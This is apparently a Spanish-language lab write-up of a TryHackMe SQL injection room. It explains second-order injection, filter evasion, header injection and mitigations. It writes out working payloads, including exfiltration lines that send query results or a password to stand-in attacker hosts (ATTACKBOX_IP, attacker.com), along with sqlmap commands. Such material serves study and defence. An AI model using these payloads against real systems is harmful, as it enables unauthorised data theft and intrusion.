# Writeup: TryHackMe — Advanced SQL Injection

## Información
- **Plataforma:** TryHackMe
- **Room:** Advanced SQL Injection (`/room/advancedsqlinjection`)
- **Path:** Web Application Pentesting
- **Dificultad:** Easy / Intermediate
- **Técnicas principales:** Second-Order SQLi, filter evasion, Out-of-Band SQLi, HTTP header injection, automation concepts
- **Fecha:** 2026-08-06

## Resumen ejecutivo

Room avanzada de SQL injection que cubre técnicas más allá del `OR 1=1`
básico: inyección de segunda orden, evasión de filtros por encoding y
case-mixing, exfiltración out-of-band (OOB) vía SMB, inyección por headers
HTTP, y una introducción a la automatización con sqlmap.

## Conceptos clave

### Tipos de SQL injection

| Tipo | Canal | Característica |
|---|---|---|
| **In-band (UNION / error-based)** | Mismo canal HTTP. | La app devuelve datos o errores directamente. |
| **Blind boolean** | Mismo canal HTTP. | Se inferen resultados según cambios en la página. |
| **Blind time-based** | Mismo canal HTTP. | Se inferen resultados por retardos en la respuesta. |
| **Out-of-band** | Canal separado (SMB/DNS/HTTP). | Se fuerza al DBMS a enviar datos por otro medio. |

### Second-Order SQL Injection

El payload malicioso se almacena en la base de datos en una primera
operación y se ejecuta cuando otra parte de la app lo reutiliza sin
sanitizar.

**Ejemplo de la room:**

1. En `add.php` se inserta un libro con un SSN como payload:
   ```sql
   12345'; UPDATE books SET book_name = 'compromised'; --+
   ```
2. `real_escape_string()` escapa las comillas para el INSERT, por lo que el
   SSN se almacena literalmente.
3. En `update.php`, el SSN almacenado se concatena en un UPDATE sin volver a
   escapar.
4. El backend usa `multi_query()`, por lo que el `;` permite ejecutar la
   segunda instrucción.

**Por qué es peligroso:** bypassa validaciones hechas solo en el punto de
entrada. El payload "descansa" en la DB hasta que otra funcionalidad lo usa.

**Mitigación:** nunca reutilizar datos sin tratarlos como input no
confiable. Usar prepared statements en **todas** las queries, no solo en la
primera.

### Filter Evasion Techniques

#### Encoding

Cuando el backend filtra keywords por blacklist, se pueden codificar
characters para que pasen el filtro y el DBMS los decodifique.

| Técnica | Ejemplo |
|---|---|
| URL encoding | `%27` = `'`, `%20` = espacio, `%7C%7C` = `\|\|` |
| Hex literal | `0x61646d696e` = `admin` |
| `CHAR()` | `CHAR(97,100,109,105,110)` = `admin` |
| `CONCAT()` | `CONCAT(0x61,0x64,0x6d,0x69,0x6e)` = `admin` |

#### Case-mixing

MySQL keywords son case-insensitivas. Un filtro case-sensitive que banea
`OR` y `or` no detecta `oR` u `Or`.

```sql
1' oR 1=1 --+
```

#### Reemplazo de espacios

Si el espacio está bloqueado, el parser SQL acepta otros separadores:

| Carácter | URL-encoded |
|---|---|
| Tabulador | `%09` |
| Nueva línea | `%0A` |
| Retorno de carro | `%0D` |
| Comentario vacío | `%2F%2A%2A%2F` (`/**/`) |

```sql
1'%0AoR%0A1=1%0A%23
```

#### Reemplazo de operadores lógicos

- `AND` → `&&`
- `OR` → `\|\|`

Cuidado: en MySQL, `\|\|` puede significar concatenación de strings si
`PIPES_AS_CONCAT` está activado.

### Out-of-Band SQL Injection

Cuando no se pueden ver datos directamente en la respuesta HTTP, se fuerza
al DBMS a enviarlos por otro canal.

#### SMB exfiltration (Windows)

```sql
1'; SELECT @@version INTO OUTFILE '\\ATTACKBOX_IP\logs\out.txt'; --+
```

Requisitos:
- DBMS en Windows (UNC paths).
- Permiso `FILE`.
- `secure_file_priv` vacío o permitiendo el destino.
- Conectividad SMB (puerto 445) entre target y atacante.

En este lab, la conectividad SMB no funcionó por restricciones de red, pero
se comprobó que MySQL sí podía escribir archivos locales. Se obtuvo
`@@version` y `@@basedir` escribiendo en `C:/xampp/htdocs/` y leyendo por
HTTP.

#### DNS exfiltration

Técnica más confiable en la vida real porque casi todos los firewalls
permiten DNS saliente:

```sql
SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 1), '.attacker.com\a.txt'));
```

El resolver DNS consulta `password123.attacker.com`, y el servidor DNS del
atacante registra el subdominio.

### HTTP Header Injection

Headers como `User-Agent`, `Referer` o `X-Forwarded-For` pueden guardarse
en logs o usarse en queries. Si no se sanitizan, son vectores de SQLi.

```bash
curl -H "User-Agent: ' UNION SELECT username, password FROM user; #" \
  http://target/httpagent/
```

**Por qué es peligroso:** muchos WAFs inspeccionan parámetros GET/POST pero
no headers. Los logs son un blanco clásico.

### Stored Procedures

Un stored procedure no es seguro por defecto. Es vulnerable si construye
queries dinámicas dentro del procedure:

```sql
CREATE PROCEDURE sp_getUserData @username NVARCHAR(50)
AS
BEGIN
  DECLARE @sql NVARCHAR(4000)
  SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
  EXEC(@sql)
END
```

La defensa correcta es usar parámetros dentro del procedure:

```sql
CREATE PROCEDURE sp_getUserData @username NVARCHAR(50)
AS
BEGIN
  SELECT * FROM users WHERE username = @username
END
```

### XML / JSON Injection

El formato del input no protege contra SQLi. Si una app parsea JSON/XML y
usa los valores en queries sin sanitizar, la inyección funciona igual.

```json
{ "username": "admin' OR '1'='1" }
```

### Automation

Herramientas mencionadas:
- **sqlmap:** la más conocida. Detecta y explota SQLi automáticamente.
- **SQLNinja:** enfocado en MSSQL.
- **BBQSQL:** Blind SQLi.
- **JSQL Injection:** apps Java.

**Cuándo usar sqlmap:**
- Blind SQLi lento.
- Validación en CTF/lab propio.
- Nunca contra un objetivo sin autorización explícita.

Comandos útiles:

```bash
sqlmap -u "http://target/page.php?id=1" --batch
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D db_name --tables
sqlmap -u "http://target/" --user-agent="*"
```

## Errores comunes y lecciones

### Error: doble encoding en el navegador

**Síntoma:** la query muestra `%20`, `%27`, etc. como texto literal.

**Causa:** el frontend de la app usa `encodeURIComponent()` y si se pega
texto ya codificado, lo vuelve a codificar.

**Solución:** usar `curl --data-urlencode` con el payload en texto plano, o
usar un archivo con `@`.

### Error: `--` sin espacio

**Síntoma:** error de sintaxis 1064.

**Causa:** MySQL requiere un espacio después de `--` para interpretarlo como
comentario.

**Solución:** usar `-- -`, `--+` (donde `+` se decodifica como espacio), o `#`.

### Error: `\|\|` genera error de concatenación

**Síntoma:** MySQL devuelve error sobre concatenación de strings.

**Causa:** en MySQL, `\|\|` es concatenación si `PIPES_AS_CONCAT` está
activado.

**Solución:** usar `oR` / `Or` (case-mixing) en lugar de `\|\|`.

### Error: UNION con diferente número de columnas

**Síntoma:** `Error Code: 1222` — "different number of columns".

**Solución:** determinar el número de columnas con `ORDER BY` y rellenar con
`NULL`:

```sql
1' AND 1=2 UNION SELECT NULL, NULL, NULL, flag FROM books; -- -
```

### Error: OOB por SMB no funciona

**Síntoma:** el payload se ejecuta pero no llega nada al servidor SMB.

**Diagnóstico:**
1. Revisar logs de `smbserver.py`.
2. Verificar conectividad con `nc -zv IP 445`.
3. Verificar `@@secure_file_priv`.
4. Si la red bloquea SMB, usar DNS exfiltration o escritura local.

## Variantes y uso real

- **Blind SQLi con scripts propios:** automatizar requests con Python y
  medir tiempos o comparar contenidos.
- **Second-Order en aplicaciones reales:** comentarios, nombres de usuario,
  campos de perfil, logs.
- **DNS exfiltration con interactsh / Burp Collaborator:** para entornos donde
  SMB no sale.
- **SQLi a RCE:** con `xp_cmdshell` (MSSQL), `INTO OUTFILE` de webshells
  (MySQL), o UDFs.

## Mitigaciones

1. **Prepared statements / parameterized queries:** separan código de datos.
2. **Input validation:** whitelist de tipos, longitudes y formatos.
3. **Least privilege:** la app no debería tener DBA ni `FILE` innecesarios.
4. **Deshabilitar `multi_query()`** si no se necesita ejecutar múltiples
   statements.
5. **Configurar `secure_file_priv`** a un directorio restringido o NULL.
6. **WAF** como capa adicional, nunca como única defensa.
7. **Code review:** buscar reutilización de datos sin sanitización.

## Herramientas usadas

- `curl` para enviar requests customizados.
- `smbserver.py` de impacket (intento de servidor SMB).
- Navegador para verificar resultados.
- Análisis manual de queries generadas por la aplicación.

## Material de referencia

- PortSwigger Web Security Academy — SQL Injection.
- PayloadsAllTheThings — SQL Injection.
- OWASP SQL Injection Prevention Cheat Sheet.
- Documentación de impacket `smbserver.py`.

## Autoevaluación

1. ¿Por qué `real_escape_string()` en el punto de entrada no protege contra
   Second-Order SQLi?
2. Nombra tres técnicas para evadir un filtro que bloquea espacios.
3. ¿Qué hace `multi_query()` y por qué es peligroso?
4. ¿Cuál es la diferencia entre `INTO OUTFILE` e `INTO DUMPFILE`?
5. ¿Por qué DNS exfiltration suele ser más confiable que SMB en entornos
   reales?
6. ¿Qué header HTTP suele usarse como vector de SQLi en logs?
7. ¿Por qué un stored procedure no es seguro por defecto?

---

**Reglas del repo:** este writeup no incluye flags ni respuestas literales.
